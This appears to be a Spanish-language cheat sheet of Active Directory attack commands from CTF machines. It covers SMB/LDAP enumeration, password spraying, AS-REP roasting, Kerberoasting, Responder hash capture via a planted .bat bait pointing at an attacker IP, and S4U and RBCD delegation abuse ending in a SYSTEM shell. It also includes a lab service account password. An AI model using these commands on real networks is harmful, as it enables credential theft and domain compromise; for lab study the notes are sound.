# SMB, LDAP y Active Directory

Comandos usados en **Chimichurri**, **GOIKO**, **PROXY** y **Forward**.

## 1. Enumeración automática (enum4linux-ng)

```
enum4linux-ng -A <IP> -oA results
```

- `-A` → enumeración agresiva: usuarios, shares, grupos, políticas de contraseña y versión del SO.
- `-oA results` → guarda la salida con ese prefijo en `results.txt`, `results.html` y `results.json` (la extensión la añade él solo, no hace falta escribirla).
- No hace falta credenciales, pero si las tienes se pueden añadir: `-u <usuario> -p '<contraseña>'`.

## 2. Listar recursos compartidos sin credenciales

```
smbclient -L //<IP> -N
```

- `-N` → sin contraseña (acceso anónimo).

Recursos habituales en un controlador de dominio: `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`. Un nombre raro (por ejemplo `drogas`) casi siempre es la vía de entrada.

## 3. Entrar a un recurso compartido

```
smbclient //<IP>/<recurso> -N
```

Dentro del `smb:`:

```
ls
get archivo.txt
put archivo.exe
mget *
exit
```

## 4. Comprobar credenciales (netexec / nxc)

```
nxc smb <IP> -u '<usuario>' -p '<contraseña>' --continue-on-success
```

- `--continue-on-success` → sigue probando aunque una clave funcione.
- `Null:Auth:True` → el acceso anónimo está permitido.
- `STATUS_LOGON_FAILURE` → credenciales mal: **las contraseñas distinguen mayúsculas**.

Comprobación también contra RDP (en Forward la respuesta fue **`Pwn3d!`**: el usuario tiene permisos de escritorio remoto):

```
nxc rdp <IP> -u '<usuario>' -p '<contraseña>'
```

Enumeración automática con credenciales:

```
nxc smb <IP> -u '<usuario>' -p '<contraseña>' --shares
nxc smb <IP> -u '<usuario>' -p '<contraseña>' --users
nxc ldap <IP> -u '<usuario>' -p '<contraseña>' --users      # usuarios vía LDAP (más campos)
```

Ejemplo real (dominio `ctf.local`, con credenciales de un usuario de servicio que ya tenemos):

```
nxc smb 10.65.172.243 -d ctf.local -u 'svc.scanner' -p '1summerlove!' --users
```

- `-d ctf.local` → dominio al que se autentica. Sin él, nxc se autentica como máquina de trabajo local (`WORKGROUP`) y la cuenta de dominio no sirve: en controladores de dominio siempre hay que pasar `-d`.
- `--users` → lista los usuarios del dominio usando unas credenciales ya válidas (el paso típico tras robar una cuenta de servicio: ves el resto de usuarios y sigues con ellos).
- Se pueden apilar opciones: `--users --shares --pass-pol` saca todo de una sola pasada.
- **Cuidado con los espacios dentro de las comillas**: `-u 'svc.scanner '` (con espacio final) autentica como `svc.scanner ` y devuelve `STATUS_LOGON_FAILURE`.

Política de contraseñas (sin credenciales, acceso anónimo):

```
crackmapexec smb <IP> --pass-pol
nxc smb <IP> --pass-pol
```

- `crackmapexec` (cme) y `nxc` (netexec) son lo mismo: cme cambió el nombre a netexec, así que `nxc` es la versión actual.
- `--pass-pol` → muestra longitud mínima, complejidad, historial, lockout y edad de las contraseñas.
- Se puede combinar con credenciales: `nxc smb <IP> -u '<usuario>' -p '<contraseña>' --pass-pol`.

Fuerza bruta / spraying SMB con listas:

```
crackmapexec smb <IP> -u users.txt -p passwords.txt
nxc smb <IP> -u users.txt -p passwords.txt
```

- `-u users.txt` → archivo con usuarios (uno por línea).
- `-p passwords.txt` → archivo con contraseñas (uno por línea).
- Prueba **cada contraseña contra cada usuario** (matriz completa); si tienes muchas contraseñas, mejor una sola contra varios usuarios para no levantar el bloqueo por lockout (`--pass-pol` te dice cada cuántos fallos bloquea).
- Resultado: `[+]` en verde = credenciales válidas, `[-]` = falló.

## 5. Conexión SMB con Impacket

```
impacket-smbclient <dominio>/<usuario>:'<contraseña>'@<IP>
```

## 6. Enumerar usuarios de dominio (Kerberos)

```
kerbrute userenum -d <dominio>.thl --dc <IP> /home/kali/SecLists/Usernames/xato-net-10-million-usernames-dup.txt -o valid_users.txt
```

- `--dc` → controlador de dominio.
- `-o` → archivo con los usuarios válidos encontrados.
- Descarga de kerbrute (binarios para Linux/Windows/Mac): <https://github.com/ropnop/kerbrute/releases>

## 7. AS-REP Roasting (usuarios sin preautenticación)

```
impacket-GetNPUsers <dominio>.thl/ -no-pass -usersfile user.txt -dc-ip <IP>
```

- Si sale `[-] User X doesn't have UF_DONT_REQUIRE_PREAUTH set` → ese usuario no sirve (todos requieren preautenticación) y el ataque queda descartado.
- Si sale un `$krb5asrep$...` → copiarlo a `hash.txt` y crackearlo con john/hashcat.

## 8. Enumeración LDAP anónima

Ver el dominio y sus contextos:

```
ldapsearch -x -H ldap://<IP> -s 'base' namingcontexts
```

Salida típica: `namingContexts: DC=dominio,DC=thl`.

Consultas a nivel de árbol:

```
ldapsearch -x -H ldap://<IP> -b "DC=dominio,DC=thl" '(objectClass=*)'
```

Filtrar solo las cuentas de personas (usuarios):

```
ldapsearch -x -H ldap://<IP> -b "dc=dominio,dc=loc" "(objectClass=person)"
```

Listar todos los grupos del dominio:

```
ldapsearch -x -H ldap://<IP> -b "dc=dominio,dc=loc" "(objectClass=group)" cn member
```

Buscar un grupo concreto (por ejemplo `rduke`) y ver sus miembros:

```
ldapsearch -x -H ldap://<IP> -b "dc=dominio,dc=loc" "(cn=rduke)" cn member
```

- El filtro va entre comillas: `(objectClass=group)` = todos los grupos, `(cn=rduke)` = solo el grupo llamado rduke.
- `cn member` al final pide solo esos atributos (nombre y miembros), así la salida es mucho más limpia.
- Para ver en qué grupos está un usuario: `"(memberOf=CN=rduke,OU=Groups,DC=dominio,DC=loc)"` (la DN completa del grupo la da el comando anterior).

> **Interpretar la salida**: `result: 0 Success` solo significa que la consulta se ejecutó bien, **no** que exista el objeto. Si ves `numResponses: N` pero todas las líneas son `ref:` (referencias a otras particiones) y ninguna entrada `# dn: ...`, es que **no ha encontrado nada**. En ese caso lista los grupos reales con `(objectClass=group)` o busca por subcadena: `"(cn=*rduke*)"`.

> Si devuelve `LdapErr: DSID-0C0909AF ... a successful bind must be completed`, el servidor exige autenticación previa: hay que pasar credenciales con `-D usuario@dominio -W`.

## 9. Enumeración de usuarios con rpcclient (RID cycling)

Sesión interactiva sin credenciales:



```

Dentro del `rpcclient:` se puede ir probando RIDs a mano (`queryuser 500`, `queryuser 501`...), o recorrer un rango con un bucle:

```
for i in $(seq 500 2000); do echo "queryuser $i" | rpcclient -U "" -N <IP> 2>/dev/null | grep -i "User Name"; done
```

- Cada usuario de Active Directory tiene un RID; el primero de un dominio siempre es `500` (Administrator).
- `2>/dev/null` descarta los RIDs que no existen y el `grep -i "User Name"` deja solo los nombres válidos.

## 10. Acceso por WinRM

```
evil-winrm -i <IP_o_dominio> -u <usuario> -p '<contraseña>'
```

Dentro de la sesión:

```
upload archivo.exe      # sube a la máquina remota
download archivo.txt    # baja el archivo
```

## 11. Información del dominio desde Windows

```
net user /domain                    # listado de usuarios del dominio
net user <usuario> /domain          # datos de una cuenta y sus grupos
net group /domain                   # listado de grupos del dominio
net group "<grupo>" /domain         # miembros de un grupo
net group "Domain Admins" /domain
whoami /groups                      # grupos del usuario actual
whoami /priv                        # privilegios del token
```

Ejemplo real:

```
net user daniel.turner /domain
```

- Con credenciales de dominio, sin ellas solo funciona `net user` (local).
- La salida de `net user <usuario> /domain` muestra los grupos a los que pertenece: de ahí se sacan candidatos a privilegiados.

## 12. Enumeración con PowerShell (módulo ActiveDirectory)

Preparar el módulo (RSAT):

```
Get-Module -ListAvailable ActiveDirectory    # ¿está instalado?
Import-Module ActiveDirectory                # cargarlo en la sesión actual
```

- Si `Get-Module -ListAvailable` no devuelve nada, el módulo no está: hay que instalarlo (`Add-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0`) o pedirlo al admin de la máquina.

**Usuarios:**

```
Get-ADUser -Filter *                          # todos los usuarios del dominio
Get-ADUser -Filter * | Select Name            # solo nombres
Get-ADUser -Identity Administrator -Properties LastLogonDate,MemberOf,Title,Description,PwdLastSet
```

- `-Filter *` → todos los objetos (equivalente a `net user /domain`, pero con más campos).
- `-Identity <samAccountName>` → un usuario concreto; `-Properties` añade atributos que por defecto no salen: `LastLogonDate` (¿cuándo se logueó?), `MemberOf` (grupos), `Title`/`Description` (a veces guardan contraseñas o pistas), `PwdLastSet` (edad de la contraseña).

**Grupos:**

```
Get-ADGroup -Filter *                # todos los grupos con sus datos
Get-ADGroup -Filter * | Select Name  # solo los nombres (listado limpio)
```

**Computadoras:**

```
Get-ADComputer -Filter * | Select Name, OperatingSystem
```

- Sacas todas las máquinas del dominio y su SO (para ver cuáles son Windows y cuáles servidores).

**Política de contraseñas del dominio:**

```
Get-ADDefaultDomainPasswordPolicy
```

- Equivalente a `nxc smb <IP> --pass-pol`: longitud mínima, complejidad, historial, lockout (cuántos fallos antes de bloquear) y edad.

## 13. Enumeración con PowerView

PowerView es otro módulo (PowerSploit), **distinto** del ActiveDirectory de la sección anterior: hay que importarlo primero desde el script `PowerView.ps1`.

**Usuarios y grupos:**

```
Get-DomainUser                    # todos los usuarios del dominio
Get-DomainUser -Identity <usuario>          # datos de uno concreto
Get-DomainGroup                   # todos los grupos
Get-DomainGroup "*admin*"         # búsqueda con comodines (wildcard)
```

- `Get-DomainGroup "*admin*"` → busca grupos cuyo nombre contenga "admin": `Domain Admins`, `Enterprise Admins`, `Administrator`... — el objetivo típico.
- Funciona igual que `Get-ADGroup -Filter *` pero sin necesitar el módulo RSAT.

**Contar resultados sin contar a mano** (sirve con cualquiera de los comandos):

```
Get-DomainComputer | Measure-Object | Select Count    # nº de cuentas de computadora
Get-DomainGroup    | Measure-Object | Select Count    # nº de grupos
Get-DomainUser     | Measure-Object | Select Count    # nº de usuarios
Get-DomainGroup "*admin*" | Measure-Object | Select Count   # nº de grupos con "admin" en el nombre
```

**Computadoras:**

```
Get-DomainComputer
Get-NetComputer                   # nombre antiguo de Get-DomainComputer (PowerView viejo)
```

- Lista las máquinas del dominio (nombre, IP, SO). `Get-NetComputer` es lo mismo en versiones antiguas de PowerView: si uno no existe, prueba con el otro.

> `net user /domain` y `Get-ADDefaultDomainPasswordPolicy` (secciones 11 y 12) son la versión "sin herramientas extra": van en cmd y en el módulo oficial de RSAT, sin importar ningún script.

## 14. Capturar hashes NTLM con Responder

Sirve para cuando **no tienes credenciales** pero sí sabes que algún servicio va a tocar un recurso: lo obligas a autenticar contra tu máquina y te quedas con su hash NetNTLMv2.

**Copia rápida:**

```
responder -I tun0
```

```bat
@echo off
dir \\TU_IP\share >nul 2>&1
```

---

**1 · Escucha** (la interfaz del túnel/VPN en Kali):

```
responder -I tun0
```

- Deja LLMNR y NBT-NS en **ON** por defecto y responde a cualquier consulta de nombre de red.
- Los hashes caen en `/usr/share/responder/logs/` (por ejemplo `SMB-NTLMv2-SSP.txt`).

**2 · Forzar la autenticación.** La forma más fácil, si hay un compartido al que un servicio lee/escribe cada poco (en PROXY era `svc.scanner`, que recorría `IT-Shared` cada 2 minutos), es dejarle un cebo:

```
smbclient //<IP>/<recurso> -N
smb: \> put cebo.bat
```

Y el cebo solo necesita apuntar a tu IP, descartando la salida para pasar desapercibido:

```bat
@echo off
dir \\TU_IP\share >nul 2>&1
```

Cuando el servicio lo procese, la conexión SMB vuelve a Responder y aparece:

```
[SMB] NTLMv2-SSP Client   : <IP de la víctima>
[SMB] NTLMv2-SSP Username : <DOMINIO>\<usuario>
[SMB] NTLMv2-SSP Hash     : <usuario>::<DOMINIO>:...
```

**3 · Con ese hash hay dos caminos:**

- **Crackearlo offline** → `hashcat -m 5600` o `john --format=netntlmv2` (ver `Fuerza bruta y crackeo.md`).
- **Relayarlo** → `impacket-ntlmrelayx -t <objetivo> -smb2support` antes de provocar la autenticación.

> Herramientas que fuerzan la autenticación de una máquina (coerción) cuando no hay servicio que rastree un compartido: `petitpotam`, `printerbug`, `spoolsample`. Recuerda que el antivirus de Windows se lleva estos binarios: descárgalos dentro de la VM.

> Si el escaneo muestra `message signing: enabled and required` en SMB, el **relay SMB no va a funcionar** (como en PROXY): en ese caso solo queda el cracking offline.

## 15. Delegación restringida con transición de protocolo (S4U)

Abuso para cuando una cuenta tiene delegación restringida con *protocol transition* (se ve con `findDelegation`): permite pedir un ticket **como otro usuario** (incluso Administrator) sin conocer su contraseña.

**1 · Ver la delegación:**

```
impacket-findDelegation <DOMINIO>/<usuario>:'<contraseña>' -dc-ip <IP_DC>
```

- En PROXY: `svc.scanner` → `Constrained w/ Protocol Transition` hacia `cifs/DC01`.

**2 · `/etc/hosts` obligatorio** (si falta, `getST` falla con `KDC_ERR_S_PRINCIPAL_UNKNOWN`):

```
<IP_DC> <DC>.<dominio> <dominio> <DC>
```

**3 · Pedir el ticket (S4U2Self + S4U2Proxy):**

```
impacket-getST -spn cifs/<DC>.<dominio> -impersonate Administrator -dc-ip <IP_DC> <DOMINIO>/<usuario>:'<contraseña>'
```

Guarda un `.ccache` con el nombre del usuario impersonado + SPN.

**4 · Usar el ticket:**

```
export KRB5CCNAME=./<nombre_del_fichero>.ccache
impacket-smbexec -k -no-pass <DOMINIO>/Administrator@<DC>.<dominio>
```

- Si da errores raros (`No such file or directory`, `Name or service not known`): `unset KRB5CCNAME` y vuelve al paso 3 exportando el nombre **exacto** del fichero (`ls` para verlo).

**Variantes en la AttackBox** (sin prefijo `impacket-`, con `.py`):

```
findDelegation.py <DOMINIO>/<usuario>:'<contraseña>' -dc-ip <IP_DC>
getST.py -spn cifs/<DC>.<dominio> -impersonate Administrator -dc-ip <IP_DC> <DOMINIO>/<usuario>:'<contraseña>'
export KRB5CCNAME=./<nombre_del_fichero>.ccache
smbexec.py -k -no-pass <DOMINIO>/Administrator@<DC>.<dominio>
```

## 16. Kerberoasting (GetUserSPNs)

Enumerar los Service Principal Names del dominio y pedir tickets de servicio para crackearlos offline:

```
impacket-GetUserSPNs <DOMINIO>/<usuario>:'<contraseña>' --request -dc-ip <IP_DC>
```

- Requiere credenciales válidas de **cualquier** usuario del dominio.
- Los SPN suelen ser cuentas de servicio (`svc.*`) con contraseñas antiguas (en Forward: SPN `helpdesk/DC01` → cuenta `svc.helpdesk`).
- `--request` devuelve además el hash `$krb5tgs$23$...` para crackear con `hashcat -m 13100` (RC4) o `-m 19700` (AES), o `john --format=krb5tgs` (ver `Fuerza bruta y crackeo.md`).

## 17. RBCD — delegación basada en recursos (impacket)

Abuso cuando BloodHound marca **AddAllowedToAct** de un usuario sobre una máquina (en Forward: `r.williams` → `DC01$`):

**1 · Crear una cuenta de equipo propia** (hace falta un usuario con permiso para añadir máquinas, p. ej. una cuenta de servicio o `t.jones`):

```
impacket-addcomputer <DOMINIO>/<usuario>:'<contraseña>' -dc-host <DC>.<dominio> -dc-ip <IP_DC>
```

- Crea una cuenta de equipo (`XXXX$`) y devuelve su contraseña.

**2 · Autorizar esa cuenta a hacerse pasar por otros en la máquina destino** (desde el usuario que tiene AddAllowedToAct):

```
impacket-rbcd <DOMINIO>/<usuario>:'<contraseña>' -dc-ip <IP_DC> -dc-host <DC>.<dominio> -delegate-to "MAQUINA$" -delegate-from "CUENTA_EQUIPO$" -action write
```

- `Delegation rights modified successfully!` → la cuenta de equipo ya puede impersonar a cualquier usuario vía S4U2Proxy.

**3 · Pedir el ticket y usarlo** (mismos pasos 3-4 de la sección 15):

```
impacket-getST -spn 'cifs/<DC>.<dominio>' -impersonate 'Administrator' <DOMINIO>/CUENTA_EQUIPO$:'<contraseña_de_la_cuenta>' -dc-ip <IP_DC>
export KRB5CCNAME=Administrator@cifs_<DC>.<dominio>@<DOMINIO>.ccache
impacket-smbexec -k -no-pass <DOMINIO>/Administrator@<DC>.<dominio>
```

> Ejemplo real (Forward): `impacket-addcomputer` con `t.jones` → cuenta `DESKTOP-...$`; `impacket-rbcd` con `r.williams` → delegación sobre `DC01$`; `getST` + `smbexec -k` → shell como SYSTEM → flag.
